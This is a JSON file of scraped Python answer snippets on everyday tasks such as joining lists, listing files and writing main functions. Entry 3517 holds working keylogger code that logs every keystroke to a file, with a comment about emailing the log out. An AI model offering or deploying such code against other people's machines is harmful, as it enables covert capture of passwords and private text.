    "description": "Couple different options # Convert List as Joining > print \",\".join(str(n) for n in numbers) # Convert using Map > ', '.join(map(str, myList))\n",
    "reg_date": "2021-10-12T11:33:35.000Z"
  },
  {
    "id": 3513,
    "keyword": null,
    "link": null,
    "title": " python join items in list",
    "description": "l = ['aaa', 'bbb', 'ccc']  s = ''.join(l) print(s) # aaabbbccc  s = ','.join(l) print(s) # aaa,bbb,ccc  s = '-'.join(l) print(s) # aaa-bbb-ccc  s = '\\n'.join(l) print(s) # aaa # bbb # ccc \n>>> sentence = ['this','is','a','sentence'] >>> '-'.join(sentence) 'this-is-a-sentence'\nfirst_list = [\"1\", \"2\"] second_list = [\"3\", \"4\"]  # Multiple ways to do this: first_list += second_list first_list = first_list + second_list first_list.extend(second_list) \n",
    "reg_date": "2021-10-12T11:33:35.000Z"
  },
  {
    "id": 3514,
    "keyword": null,
    "link": null,
    "title": " python join list with comma",
    "description": "my_list = ['a', 'b', 'c', 'd'] my_string = ','.join(map(str, my_list)) #Ensures values are processed as strings #Result: 'a,b,c,d'\n",
    "reg_date": "2021-10-12T11:33:35.000Z"
  },
  {
    "id": 3515,
    "keyword": null,
    "link": null,
    "title": " python json dump utf8",
    "description": "data = {    \"name\": \"foo\",   \"age\": 27 } with open(\"test.json\", 'w', encoding='utf8') as outfile:     json.dump(data, outfile, indent=2)\n",
    "reg_date": "2021-10-12T11:33:35.000Z"
  },
  {
    "id": 3516,
    "keyword": null,
    "link": null,
    "title": " python key down",
    "description": "import keyboard # if key 'a' is pressed  if keyboard.is_pressed('a'): \tprint('a key has ben pressed')\nimport keyboard  # using module keyboard  if keyboard.is_pressed('e'):  # if key 'e' is pressed  \tprint(\"you're holding the E key!\") \n",
    "reg_date": "2021-10-12T11:33:35.000Z"
  },
  {
    "id": 3517,
    "keyword": null,
    "link": null,
    "title": " python keylogger",
    "description": "import logging import os from pynput.keyboard import Listener  log_Directory = os.getcwd() + '/'  # where save file print(os.getcwd()) # directory # create file  logging.basicConfig(filename=(log_Directory + \"key_log.txt\"), level=logging.DEBUG, format='%(asctime)s: %(message)s')  # function in logging def on_press(key):     logging.info(key)     # when press key save the key in file   with Listener(on_press=on_press) as listener:     listener.join()  # infinite cicle\n#pip install pynput OR python3 -m pip install pynput #ONLY ONE MODULE REQUIRED from pynput.keyboard import Listener #add \", Key\" here if you want to be able to act when keys like Enter and esc are pressed) #you can use the yagmail python module to email yourself the log with a gmail account when a key is pressed (if key.char == ... OR if key=Key.(esc, enter, shift)) file = open(\"log.txt\", \"a\") #save to the current directory. To save to another location use r'C:\\Users\\k\\t\\m\\etc\\log.txt' #NOTE - it does not matter if \"log.txt\" exists or not. Python will automatically create that file. def on_press(key):   try:     file.write(f'\\n{key}')     file.flush() #save changes   except:     pass #ignore all errors listener = Listener(on_press=on_press) #you can also use \"with listener as Listener(on_press...):\" listener.start() listener.join()\n#Import required modules from pynput.keyboard import Key #Create an empty list to store pressed keys keys = [] #Create a function that defines what to do on each key press def on_each_key_press(key):     #Append each pressed key to a list     keys.append(key)     #Write list to file after each key pressed     write_keys_to_file(keys) \n",
    "reg_date": "2021-10-12T11:33:35.000Z"
  },
  {
    "id": 3518,
    "keyword": null,
    "link": null,
    "title": " python kill script",
    "description": "import sys sys.exit()\npkill -9 python\n",
    "reg_date": "2021-10-12T11:33:35.000Z"
  },
  {
    "id": 3519,
    "keyword": null,
    "link": null,
    "title": " python kivy Kivy files require #:kivy !",
    "description": "#:kivy 1.0  Button:     text: 'Hello from test.kv'\n",
    "reg_date": "2021-10-12T11:33:35.000Z"
  },
  {
    "id": 3520,
    "keyword": null,
    "link": null,
    "title": " python know the number of a loop",
    "description": "a_list = [\"a\", \"b\", \"c\", \"d\"]  for iteration, item in enumerate(a_list):   print(iteration)\n",
    "reg_date": "2021-10-12T11:33:35.000Z"
  },
  {
    "id": 3521,
    "keyword": null,
    "link": null,
    "title": " python lambda practice",
    "description": "def mul_by_num(num):     \"\"\"     Returns a function that takes one argument and returns num     times that argument.     >>> x = mul_by_num(5)     >>> y = mul_by_num(2)     >>> x(3)     15     >>> y(-4)     -8     \"\"\"     \"*** YOUR CODE HERE ***\"     return ______     return lambda num2: num * num2\n",
    "reg_date": "2021-10-12T11:33:36.000Z"
  },
  {
    "id": 3522,
    "keyword": null,
    "link": null,
    "title": " python lambda without arguments",
    "description": "lambda: print(\"no args\")\n",
    "reg_date": "2021-10-12T11:33:36.000Z"
  },
  {
    "id": 3523,
    "keyword": null,
    "link": null,
    "title": " python last element in list",
    "description": "# To get the last element in a list you use -1 as position bikes = ['trek', 'redline', 'giant'] bikes[-1] # Output: # 'giant'\nsome_list[-1]\nMyList=[\"Black\",\"Blue\",\"Red\",\"Green\"] print(MyList[-1])\nprint(list[-1])\nlist1 = ['a','b','c'] print(list1[-1])\n# The smart way  list = [\"first item\", \"second item\", \"third item\"] print(list[len(list) - 1])  # The proper way print(list[-1])\n",
    "reg_date": "2021-10-12T11:33:36.000Z"
  },
  {
    "id": 3524,
    "keyword": null,
    "link": null,
    "title": " python last element list",
    "description": "# To get the last element in a list you use -1 as position bikes = ['trek', 'redline', 'giant'] bikes[-1] # Output: # 'giant'\nsome_list[-1]\nMyList=[\"Black\",\"Blue\",\"Red\",\"Green\"] print(MyList[-1])\nl = [1,2,3,4,5] last = l[len(l)-1]\nnumber_list = [1, 2, 3] print(number_list[-1]) #Gives 3  number_list[-1] = 5 # Set the last element print(number_list[-1]) #Gives 5  number_list[-2] = 3 # Set the second to last element number_list [1, 3, 5]\n",
    "reg_date": "2021-10-12T11:33:36.000Z"
  },
  {
    "id": 3525,
    "keyword": null,
    "link": null,
    "title": " python last element of list",
    "description": "# To get the last element in a list you use -1 as position bikes = ['trek', 'redline', 'giant'] bikes[-1] # Output: # 'giant'\nsome_list[-1]\nprint(list[-1])\n>>> list[-1:] # returns indexed value     [3] >>> list[-1]  # returns value     3\nimport operator # Python code to access the last element # in a list using itemgetter() method    # Declaring and  initializing list  number_list = [2, 1, 7, 4, 5, 3,6]    print (\"List of elements are : \" + str(number_list))  getLastElement = operator.itemgetter(-1)   # using [] operator to print last element print(\"The last element of list using reverse method are : \"                             +  str(getLastElement(number_list))) \n# to print the last item from a list print(list[-1])\n",
    "reg_date": "2021-10-12T11:33:36.000Z"
  },
  {
    "id": 3526,
    "keyword": null,
    "link": null,
    "title": " python launch file",
    "description": "#how to open file with the default application for that file set by the OS  import os  filename = \"PATH_TO_FILE\" # EG. \"C:\\Users\\baguette\\Downloads\\image.png\"  os.system(\"open \" + shlex.quote(filename)) #MacOS/X os.system(\"start \" + filename) #windows  #Information and more available at  #https://stackoverflow.com/questions/434597/open-document-with-default-os-application-in-python-both-in-windows-and-mac-os\n# press [windows] + [R] (on windows only) # use the command : cd/the_way_of_your_program # and now use this command :  py the_name_of_your_program.py   # don't forget to write the extension (py for python)  # at the end of your program name\n",
    "reg_date": "2021-10-12T11:33:36.000Z"
  },
  {
    "id": 3527,
    "keyword": null,
    "link": null,
    "title": " python leap year solution",
    "description": "def is_leap(year):    return year % 4 == 0 and (year % 100 != 0 or year % 400 == 0)\n",
    "reg_date": "2021-10-12T11:33:36.000Z"
  },
  {
    "id": 3528,
    "keyword": null,
    "link": null,
    "title": " python legend being cut off",
    "description": "# Error: # After saving your plots, parts of the plot (legend, labels, etc) are # cut off.  # Solution: # Add bbox_inches='tight' plt.savefig('my_figure', bbox_inches='tight')\n",
    "reg_date": "2021-10-12T11:33:36.000Z"
  },
  {
    "id": 3529,
    "keyword": null,
    "link": null,
    "title": " python letter arr",
    "description": "letters = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']\n",
    "reg_date": "2021-10-12T11:33:36.000Z"
  },
  {
    "id": 3530,
    "keyword": null,
    "link": null,
    "title": " python line chart",
    "description": "import matplotlib.pyplot as plt     Year = [1920,1930,1940,1950,1960,1970,1980,1990,2000,2010] Unemployment_Rate = [9.8,12,8,7.2,6.9,7,6.5,6.2,5.5,6.3]    plt.plot(Year, Unemployment_Rate) plt.title('Unemployment Rate Vs Year') plt.xlabel('Year') plt.ylabel('Unemployment Rate') plt.show() \n",
    "reg_date": "2021-10-12T11:33:36.000Z"
  },
  {
    "id": 3531,
    "keyword": null,
    "link": null,
    "title": " python link to jpg",
    "description": "import urllib.request urllib.request.urlretrieve(\"http://www.gunnerkrigg.com//comics/00000001.jpg\", \"00000001.jpg\")\n",
    "reg_date": "2021-10-12T11:33:37.000Z"
  },
  {
    "id": 3532,
    "keyword": null,
    "link": null,
    "title": " python list 1 to n",
    "description": "myList = list(range(1, 101))\na_list = list(range(1, 5))\n",
    "reg_date": "2021-10-12T11:33:37.000Z"
  },
  {
    "id": 3533,
    "keyword": null,
    "link": null,
    "title": " python list all files in directory",
    "description": "import os  files = os.listdir('.') print(files) for file in files:   # do something   \nfrom shutil import copyfile copyfile(src, dst)\nimport os print(os.listdir('/path/to/folder/to/list'))\nfrom os import listdir from os.path import isfile, join onlyfiles = [f for f in listdir(mypath) if isfile(join(mypath, f))]\nimport os def fn():       # 1.Get file names from directory     file_list=os.listdir(r\"C:\\Users\")     print (file_list)   #2.To rename files fn()\n import os  arr = os.listdir()  print(arr)    >>> ['$RECYCLE.BIN', 'work.txt', '3ebooks.txt', 'documents'] \n",
    "reg_date": "2021-10-12T11:33:37.000Z"
  },
  {
    "id": 3534,
    "keyword": null,
    "link": null,
    "title": " python list ascii",
    "description": "import string print(string.printable) # prints all printable ascii caracters\n#first, if you are on windows download the module typing on cmd: pip install ascii import ascii #ascii list down here! print ascii.charlist()\n",
    "reg_date": "2021-10-12T11:33:37.000Z"
  },
  {
    "id": 3535,
    "keyword": null,
    "link": null,
    "title": " python list comma separated string",
    "description": "hobbies = [\"basketball\", \"football\", \"swimming\"] print(\"My hobbies are:\")      \t# My hobbies are: print(\", \".join(hobbies)) \t\t# basketball, football, swimming\nconverted_list = [str(element) for element in a_list]\n",
    "reg_date": "2021-10-12T11:33:37.000Z"
  },
  {
    "id": 3536,
    "keyword": null,
    "link": null,
    "title": " python list comprehension if else",
    "description": "# if/else [f(x) if condition(x) else '' for x in sequence]\n[statement if condition else statement for _ in iterable_object] #statement are without assignment\nl = [22, 13, 45, 50, 98, 69, 43, 44, 1] a = [x + 1 if x >= 45 else x + 5 for x in l]\n[f(x) if condition else g(x) for x in sequence]\n[f(x) for x in sequence if condition]\n>>> original_prices = [1.25, -9.45, 10.22, 3.78, -5.92, 1.16] >>> prices = [i if i > 0 else 0 for i in original_prices] >>> prices [1.25, 0, 10.22, 3.78, 0, 1.16]\n",
    "reg_date": "2021-10-12T11:33:37.000Z"
  },
  {
    "id": 3537,
    "keyword": null,
    "link": null,
    "title": " python list comprehension index, value",
    "description": "list2 = [x for ind, x in enumerate(list1) if 4 > ind > 0]\n",
    "reg_date": "2021-10-12T11:33:37.000Z"
  },
  {
    "id": 3538,
    "keyword": null,
    "link": null,
    "title": " python list contains substring",
    "description": "str_list = [\"one\", \"two\", \"three\"] substr = \"wo\" if any(substr in str for str in str_list): \tprint('Yes!')\nstr in strList  # example if 'qwe' in strList: \tprint('Yes!')\nmatchers = ['abc','def'] matching = [s for s in my_list if any(xs in s for xs in matchers)]  Output: ['abc-123', 'def-456', 'abc-456']\n",
    "reg_date": "2021-10-12T11:33:37.000Z"
  },
  {
    "id": 3539,
    "keyword": null,
    "link": null,
    "title": " python list files in current directory",
    "description": "import os  files = os.listdir('.') print(files) for file in files:   # do something   \nfrom shutil import copyfile copyfile(src, dst)\nimport os def fn():       # 1.Get file names from directory     file_list=os.listdir(r\"C:\\Users\")     print (file_list)   #2.To rename files fn()\nlstJson = [f for f in os.listdir(str(self.pathJson)) if f.endswith('.json')]         return lstJson\nimport os #this command will store all .txt files in same directories ALL_FILES_IN_DIR = [ELEM for ELEM in os.listdir() if \"txt\" in ELEM]  #ALL DIRETORIES  ALL_DIR = [ELEM for ELEM in os.listdir() if \".\" not in ELEM] \nfrom os import listdir file_list = listdir(folder_path)\n",
    "reg_date": "2021-10-12T11:33:37.000Z"
  },
  {
    "id": 3540,
    "keyword": null,
    "link": null,
    "title": " python list keys from dictionary",
    "description": "# Basic syntax: list_of_keys = list(dictionary.keys())\n# To get all the keys of a dictionary use 'keys()' newdict = {1:0, 2:0, 3:0} newdict.keys() # Output: # dict_keys([1, 2, 3])\n",
    "reg_date": "2021-10-12T11:33:37.000Z"
  },
  {
    "id": 3541,
    "keyword": null,
    "link": null,
    "title": " python list methods",
    "description": "list.append(x) # append x to end of list list.extend(iterable) # append all elements of iterable to list list.insert(i, x) # insert x at index i list.remove(x) # remove first occurance of x from list list.pop([i]) # pop element at index i (defaults to end of list) list.clear() # delete all elements from the list list.index(x[, start[, end]]) # return index of element x list.count(x) # return number of occurances of x in list list.reverse() # reverse elements of list in-place (no return) list.sort(key=None, reverse=False) # sort list in-place list.copy() # return a shallow copy of the list\nlist.append() list.clear() list.copy()\t list.count() list.extend() list.index()      list.insert()\t list.pop()\t list.remove()\t list.reverse()\t list.append()\t list.clear()\t list.copy()\t list.count()\t list.extend()\t list.index()\t list.insert()\t list.pop()\t list.remove()\t list.reverse()\t list.sort()\t sorted(list)    \nmy_list = [\"banana\", \"cherry\", \"apple\"]  # len() : get the number of elements in a list print(\"Length:\", len(my_list))  # append() : adds an element to the end of the list my_list.append(\"orange\")  # insert() : adds an element at the specified position my_list.insert(1, \"blueberry\") print(my_list)  # pop() : removes and returns the item at the given position, default is the last item item = my_list.pop() print(\"Popped item: \", item)  # remove() : removes an item from the list my_list.remove(\"cherry\") # Value error if not in the list print(my_list)  # clear() : removes all items from the list my_list.clear() print(my_list)  # reverse() : reverse the items my_list = [\"banana\", \"cherry\", \"apple\"] my_list.reverse() print('Reversed: ', my_list)  # sort() : sort items in ascending order my_list.sort() print('Sorted: ', my_list)  # use sorted() to get a new list, and leave the original unaffected. # sorted() works on any iterable type, not just lists my_list = [\"banana\", \"cherry\", \"apple\"] new_list = sorted(my_list)  # create list with repeated elements list_with_zeros = [0] * 5 print(list_with_zeros)  # concatenation list_concat = list_with_zeros + my_list print(list_concat)  # convert string to list string_to_list = list('Hello') print(string_to_list) \n# Method\tDescription # append()\tAdds an element at the end of the list # clear()\tRemoves all the elements from the list # copy()\tReturns a copy of the list # count()\tReturns the number of elements with the specified value # extend()\tAdd the elements of a list (or any iterable), to the end of the current list # index()\tReturns the index of the first element with the specified value # insert()\tAdds an element at the specified position # pop()\tRemoves the element at the specified position # remove()\tRemoves the first item with the specified value # reverse()\tReverses the order of the list # sort()\tSorts the list # Note: Python does not have built-in support for Arrays, but Py# Method\tDescription # append()\tAdds an element at the end of the list # clear()\tRemoves all the elements from the list # copy()\tReturns a copy of the list # count()\tReturns the number of elements with the specified value # extend()\tAdd the elements of a list (or any iterable), to the end of the current list # index()\tReturns the index of the first element with the specified value # insert()\tAdds an element at the specified position # pop()\tRemoves the element at the specified position # remove()\tRemoves the first item with the specified value # reverse()\tReverses the order of the list # sort()\tSorts the list\n#Objects can also contain methods. Methods in objects are functions that belong to the object. #Let us create a method in the Person class:  class Person:      def __init__(self, name, age):     self.name = name     self.age = age    def myfunc(self): # This is a method     print(\"Hello my name is \" + self.name)  p1 = Person(\"John\", 36) p1.myfunc()\n# empty list print(list())  # vowel string vowel_string = 'aeiou' print(list(vowel_string))  # vowel tuple vowel_tuple = ('a', 'e', 'i', 'o', 'u') print(list(vowel_tuple))  # vowel list vowel_list = ['a', 'e', 'i', 'o', 'u'] print(list(vowel_list))\n",
    "reg_date": "2021-10-12T11:33:38.000Z"
  },
  {
    "id": 3542,
    "keyword": null,
    "link": null,
    "title": " python list multiplication",
    "description": "import numpy list1 = [1, 2, 3]   # using numpy.prod() to get the multiplications result = numpy.prod(list1)  # Result = 6\na_list = [1, 2, 3]  a_list = [item * 2 for item in a_list]  print(a_list) OUTPUT [2, 4, 6]\n",
    "reg_date": "2021-10-12T11:33:38.000Z"
  },
  {
    "id": 3543,
    "keyword": null,
    "link": null,
    "title": " python list of random values",
    "description": "# To create a list of random integer values: import random randomlist = random.sample(range(10, 30), 5) # Output: # [16, 19, 13, 18, 15]  # To create a list of random float numbers: import numpy random_float_array = numpy.random.uniform(75.5, 125.5, 2) # Output: # [107.50697835, 123.84889979]\nimport random randomlist = [] for i in range(0,5): n = random.randint(1,30) randomlist.append(n) print(randomlist)\n",
    "reg_date": "2021-10-12T11:33:38.000Z"
  },
  {
    "id": 3544,
    "keyword": null,
    "link": null,
    "title": " python list shift left",
    "description": "from collections import deque items = deque([1, 2]) items.append(3)        # deque == [1, 2, 3] items.rotate(1)        # The deque is now: [3, 1, 2] items.rotate(-1)       # Returns deque to original state: [1, 2, 3] item = items.popleft() # deque == [2, 3] \n",
    "reg_date": "2021-10-12T11:33:38.000Z"
  },
  {
    "id": 3545,
    "keyword": null,
    "link": null,
    "title": " python list with all letters",
    "description": "alphabet_list = list(string.ascii_lowercase)\n>>> import string >>> string.ascii_lowercase 'abcdefghijklmnopqrstuvwxyz'\n#Python: premade alphabet string   import string string.ascii_lowercase \t#output: 'abcdefghijklmnopqrstuvwxyz' string.ascii_uppercase \t#output: 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'\n",
    "reg_date": "2021-10-12T11:33:38.000Z"
  },
  {
    "id": 3546,
    "keyword": null,
    "link": null,
    "title": " python liste alphabaet",
    "description": "['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']\n",
    "reg_date": "2021-10-12T11:33:38.000Z"
  },
  {
    "id": 3547,
    "keyword": null,
    "link": null,
    "title": " python load pandas from pickle",
    "description": ">>> unpickled_df = pd.read_pickle(\"./dummy.pkl\") >>> unpickled_df    foo  bar 0    0    5 1    1    6 2    2    7 3    3    8 4    4    9 \n",
    "reg_date": "2021-10-12T11:33:38.000Z"
  },
  {
    "id": 3548,
    "keyword": null,
    "link": null,
    "title": " python localhost",
    "description": "# If Python version returned above is 3.X python3 -m http.server # On windows try \"python\" instead of \"python3\", or \"py -3\" # If Python version returned above is 2.X python -m SimpleHTTPServer\nOn Ubuntu go to Commands and hit these two commands-> cd folderName python3 -m http.server 8080\npython -m SimpleHTTPServer 8000 \npython -m SimpleHTTPServer 12345 \n",
    "reg_date": "2021-10-12T11:33:38.000Z"
  },
  {
    "id": 3549,
    "keyword": null,
    "link": null,
    "title": " python lock using a file",
    "description": "from filelock import FileLock  with FileLock(\"myfile.txt.lock\"):     print(\"Lock acquired.\")     with open(\"myfile.txt\"):         # work with the file as it is now locked \n",
    "reg_date": "2021-10-12T11:33:38.000Z"
  },
  {
    "id": 3550,
    "keyword": null,
    "link": null,
    "title": " python logging to console exqmple",
    "description": "import sys # ... logging.getLogger().addHandler(logging.StreamHandler(sys.stdout)) \n",
    "reg_date": "2021-10-12T11:33:38.000Z"
  },
  {
    "id": 3551,
    "keyword": null,
    "link": null,
    "title": " python loop certain number of times",
    "description": "# To loop n times, use loop over range(n) for i in range(n):   # Do something\n",
    "reg_date": "2021-10-12T11:33:39.000Z"
  },
  {
    "id": 3552,
    "keyword": null,
    "link": null,
    "title": " python loop through all folders and subfolders",
    "description": "directory = \"c:\\\\folder\\\\you\\\\want\\\\to\\\\work_on\"  for root, subdirectories, files in os.walk(directory):     for subdirectory in subdirectories:         print(os.path.join(root, subdirectory))     for file in files:         print(os.path.join(root, file))\n",
    "reg_date": "2021-10-12T11:33:39.000Z"
  },
  {
    "id": 3553,
    "keyword": null,
    "link": null,
    "title": " python loop through files in directory",
    "description": "import os directory = 'the/directory/you/want/to/use'  for filename in os.listdir(directory):     if filename.endswith(\".txt\"):       #do smth       continue     else:     continue\nimport os  for filename in os.listdir(directory):     if filename.endswith(\".asm\") or filename.endswith(\".py\"):           # print(os.path.join(directory, filename))         continue     else:         continue\nimport os  for filename in os.listdir(directory):     if filename.endswith(\".asm\") or filename.endswith(\".py\"):           # print(os.path.join(directory, filename))         continue     else:         continue \nbasepath = \"pathtodir/DataFiles/\" for filename in os.listdir(basepath):     if filename.endswith(\".log\"):          print(os.path.join(\"./DataFiles\", filename))          with open(basepath + filename) as openfile:                 for line in openfile:             ........\n",
    "reg_date": "2021-10-12T11:33:39.000Z"
  },
  {
    "id": 3554,
    "keyword": null,
    "link": null,
    "title": " python loop through files in directory recursively",
    "description": "import os rootdir = './path/to/files/'  for subdir, dirs, files in os.walk(rootdir):     for file in files:         print os.path.join(subdir, file)\n",
    "reg_date": "2021-10-12T11:33:39.000Z"
  },
  {
    "id": 3555,
    "keyword": null,
    "link": null,
    "title": " python loop through list",
    "description": "list = [1, 3, 6, 9, 12]      for i in list:      print(i) \nlist = [1, 3, 5, 7, 9]   # with index    for index, item in enumerate(list):      print (item, \" at index \", index)      # without index for item in list:   \tprint(item)\nfoo = ['foo', 'bar'] for i in foo:   print(i) #outputs 'foo' then 'bar' for i in range(len(foo)):   print(foo[i]) #outputs 'foo' then 'bar' i = 0 while i < len(foo):   print(foo[i]) #outputs 'foo' then 'bar'\n# Python code to iterate over a list list = [1, 2, 3, 4, 5, 6]  # Method 1: Using \"var_name in list\" syntax # Pro: Consise, easily readable # Con: Can't access index of item for item in list:   print(item)    # Method 2: Using list indices # Pro: Can access index of item in list # Con: Less consise, more complicated to read for index in range(len(list)-1):   print(list[index])    # Method 3: Using enumerate() # Pro: Can easily access index of item in list # Con: May be too verbose for some coders for index, value in enumerate(list):   print(value) \nlst = [10, 50, 75, 83, 98, 84, 32]   for x in range(len(lst)):      print(lst[x])  \n# Python list my_list = [1, 2, 3]  # Python automatically create an item for you in the for loop for item in my_list:   print(item)     \n",
    "reg_date": "2021-10-12T11:33:39.000Z"
  },
  {
    "id": 3556,
    "keyword": null,
    "link": null,
    "title": " python lowercase",
    "description": "// turn to lower/upper string = string.upper() string = string.lower()  // check if all letter are lower or upper string.islower() string.isupper()\n# By Alan W. Smith and Petar Ivanov s = \"Kilometer\" print(s.lower())\nstring = (\"PYTHON\").lower() print(string) \nstr = 'HELLO' print(str.lower())  #prints \"hello\"\nstr.lower()\nstring.lower()\n",
    "reg_date": "2021-10-12T11:33:39.000Z"
  },
  {
    "id": 3557,
    "keyword": null,
    "link": null,
    "title": " python magic number",
    "description": "MagicNumber = [] confirmation = \"Confirm\" Cancel = \"Cancel\"  for n in range(5):     # prompting user to enter the magic number     try:         user = int(input(\"Please Enter your Magic number: \"))         # add user number to the list         MagicNumber.append(user)         # user confirmation to continue or cancel the process         if True:             print(f\"The value you enter was : {user}\")             UserConfirm = input(\" Enter Confirm to Continue or cancel to Cancel: \")             if UserConfirm == confirmation:                 continue             elif UserConfirm == Cancel:                 break             # in case the user enter a wrong confirmation keyword instead of confirm or Cancel             else:                 print(\"------------------------------------------\")                 print(\"Not a correct input, Please try  again!!!\")                 print(\"------------------------------------------\")                 if True:                     print(\"The Number you enter was : \", user)                     UserConfirm = input(\" Enter Confirm to Continue or cancel to Cancel: \")                     if UserConfirm == confirmation:                         continue                     elif UserConfirm == Cancel:                         break     # if user enter a wrong type of number (ex:string or float) instead of throwing an error     # user receive a message     except ValueError:         print(\"wrong type of number, Prefer integer\")  print(\"Your Magic Number are: \", MagicNumber)\n",
    "reg_date": "2021-10-12T11:33:39.000Z"
  },
  {
    "id": 3558,
    "keyword": null,
    "link": null,
    "title": " python magic windows error",
    "description": "pip install python-magic-bin==0.4.14\n",
    "reg_date": "2021-10-12T11:33:39.000Z"
  },
  {
    "id": 3559,
    "keyword": null,
    "link": null,
    "title": " python main",
    "description": "def main():     print(\"Hello World!\")  if __name__ == \"__main__\":     main()\nif __name__ == \"__main__\":\n# Defining main function  def main():      print(\"hello World\")        # Using the special variable   # __name__  if __name__==\"__main__\":      main() \n print(\"Hello\")  print(\"__name__ value: \", __name__)   def main():     print(\"python main function\")   if __name__ == '__main__':     main() \nif __name__ == \"__main__\":     # execute only if run as a script     main() \n 1from time import sleep  2  3print(\"This is my file to demonstrate best practices.\")  4  5def process_data(data):  6    print(\"Beginning data processing...\")  7    modified_data = data + \" that has been modified\"  8    sleep(3)  9    print(\"Data processing finished.\") 10    return modified_data 11 12def read_data_from_web(): 13    print(\"Reading data from the Web\") 14    data = \"Data from the web\" 15    return data 16 17def write_data_to_database(data): 18    print(\"Writing data to a database\") 19    print(data) 20 21def main(): 22    data = read_data_from_web() 23    modified_data = process_data(data) 24    write_data_to_database(modified_data) 25 26if __name__ == \"__main__\": 27    main() \n",
    "reg_date": "2021-10-12T11:33:39.000Z"
  },
  {
    "id": 3560,
    "keyword": null,
    "link": null,
    "title": " python main function",
    "description": "def main():     print(\"Hello World!\")  if __name__ == \"__main__\":     main()\n# Defining main function  def main():      print(\"hello World\")        # Using the special variable   # __name__  if __name__==\"__main__\":      main() \n print(\"Hello\")  print(\"__name__ value: \", __name__)   def main():     print(\"python main function\")   if __name__ == '__main__':     main() \nif __name__ == \"__main__\":     # execute only if run as a script     main() \n",
    "reg_date": "2021-10-12T11:33:39.000Z"
  },
  {
    "id": 3561,
    "keyword": null,
    "link": null,
    "title": " python make a random number",
    "description": "# generate random integer values from random import seed from random import randint # seed random number generator seed(1) # generate some integers for _ in range(10): \tvalue = randint(0, 10) \tprint(value) \n",
    "reg_date": "2021-10-12T11:33:40.000Z"
  },
  {
    "id": 3562,
    "keyword": null,
    "link": null,
    "title": " python make a shop menu",
    "description": "# this is my own work from a fun project of a text based game I am making  def shopkeep(player_gold, player_inv, general_store_inv):     for x in range(8):         print()     print(\"Shopkeeper: Welcome to my humble shop for now!\")     time.sleep(0.5)     shopkeep_leave = False     while shopkeep_leave is False:         x2 = 0         print(\"\\nShopkeeper: Care to peruse my wares?\\n\")         time.sleep(1)         print(\"Shopkeeper: The upgraded sword and shield are 5 gold each, everything else is 2 gold.\")         print(\"Gold in coin purse: \" + str(player_gold))         for x in general_store_inv:             time.sleep(0.2)             print(str(x2 + 1) + \". \" + str(general_store_inv[x2]))             x2 += 1         shop_purchase = input(\"\"\"Please select:             > \"\"\")         if shop_purchase == \"\":             shop_purchase = \"1\"         int_choice = int(shop_purchase) - 1         if x2 < 1:             print(\"Shopkeeper: Sorry lad, just realised we're out of stock!\")             time.sleep(1)             print(\"You leave the store\")             shopkeep_leave = True             return player_gold, player_inv, general_store_inv         if int_choice <= x2:             print(\"You want to buy: \" + str(general_store_inv[int_choice]) + \" is this correct?\\nY/N\")             confirm = input(\"   > \")             if \"Y\" in confirm.upper():                 if \"apple\" in str(general_store_inv[int_choice]):                     if player_gold >= 2:                         time.sleep(0.5)                         print(\"You pay 2g and obtain an apple!\")                         player_inv.append(\"apple\")                         general_store_inv.remove(\"apple\")                         player_gold -= 2                     else:                         print(\"Shopkeep: Looks like you can't afford that!\")                 elif \"sword2\" in str(general_store_inv[int_choice]):                     if player_gold >= 5:                         time.sleep(0.5)                         print(\"You pay 5g and obtain an upgraded sword!\")                         player_inv.append(\"sword2\")                         general_store_inv.remove(\"sword2\")                         player_gold -= 5                     else:                         print(\"Shopkeep: Looks like you can't afford that!\")                 elif \"sword\" in str(general_store_inv[int_choice]):                     if player_gold >= 2:                         time.sleep(0.5)                         print(\"You pay 2g and obtain a basic sword!\")                         player_inv.append(\"sword\")                         general_store_inv.remove(\"sword\")                         player_gold -= 2                     else:                         print(\"Shopkeep: Looks like you can't afford that!\")                 elif \"shield\" in str(general_store_inv[int_choice]):                     if player_gold >= 5:                         time.sleep(0.5)                         print(\"You pay 5g and obtain a shield!\")                         player_inv.append(\"shield\")                         general_store_inv.remove(\"shield\")                         player_gold -= 2                     else:                         print(\"Shopkeep: Looks like you can't afford that!\")                 elif \"brown coat\" in str(player_inv[int_choice]):                     if player_gold >= 2:                         time.sleep(0.5)                         print(\"You pay 2g and obtain a brown coat!\")                         player_inv.append(\"brown coat\")                         general_store_inv.remove(\"brown coat\")                         player_gold -= 2                     else:                         print(\"Shopkeep: Looks like you can't afford that!\")             elif confirm == \"\":                 print(\"Shopkeeper: I take it you didn't want that then\")                 time.sleep(2)             else:                 confirm = input(\"Shopkeeper: Do you want to exit?\\n    > \")                 if \"Y\" in confirm.upper():                     shopkeep_leave = True                     return player_gold, player_inv, general_store_inv      return player_gold, player_inv, general_store_inv\n",
    "reg_date": "2021-10-12T11:33:40.000Z"
  },
  {
    "id": 3563,
    "keyword": null,
    "link": null,
    "title": " python make button do more than one command",
    "description": "# Make a button do more than one command def funct1():   print(\"function 1\")  def funct2():   print(\"function 2\")  Button(root, text=\" test\", command=lambda:[funct1(),funct2()])\n",
    "reg_date": "2021-10-12T11:33:40.000Z"
  },
  {
    "id": 3564,
    "keyword": null,
    "link": null,
    "title": " python make directory if not exists",
    "description": "import os if not os.path.exists('my_folder'):     os.makedirs('my_folder')\nfrom pathlib import Path Path(\"/my/directory\").mkdir(parents=True, exist_ok=True)    #python 3.5 above\ntry:     os.makedirs(\"path/to/directory\") except FileExistsError:     # directory already exists     pass \n",
    "reg_date": "2021-10-12T11:33:40.000Z"
  },
  {
    "id": 3565,
    "keyword": null,
    "link": null,
    "title": " python make integer into a list",
    "description": "res = [int(x) for x in str(num)] \n",
    "reg_date": "2021-10-12T11:33:40.000Z"
  },
  {
    "id": 3566,
    "keyword": null,
    "link": null,
    "title": " python make txt file",
    "description": "file = open(\"text.txt\", \"w\")  file.write(\"Your text goes here\")  file.close()  'r' open for reading (default) 'w' open for writing, truncating the file first 'x' open for exclusive creation, failing if the file already exists 'a' open for writing, appending to the end of the file if it exists\n\tf= open(\"guru99.txt\",\"w+\")\n",
    "reg_date": "2021-10-12T11:33:40.000Z"
  },
